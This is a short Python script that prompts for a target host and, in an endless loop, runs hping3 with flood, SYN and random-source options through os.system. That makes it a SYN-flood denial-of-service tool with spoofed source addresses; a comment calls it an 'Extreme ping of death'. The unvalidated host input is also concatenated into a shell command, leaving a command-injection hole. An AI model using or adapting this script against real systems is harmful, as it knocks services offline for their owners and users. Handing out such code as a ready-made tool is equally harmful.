import os
import time
import threading as th


host_addr = input("Enter the host address : ")

def singleHost(host_addr):
    print("Thread loaded for host : " + host_addr)
    os.system("sudo hping3 --flood -S -V --rand-source " + host_addr)
    
def singleDeath():
    th1 = th.Thread(target=singleHost(host_addr))
    th1.start()
    time.sleep(5)
    th1.join()
    print("Count completed successfully")

# Process to run Extreme ping of death on a host
while True:
    singleDeath()    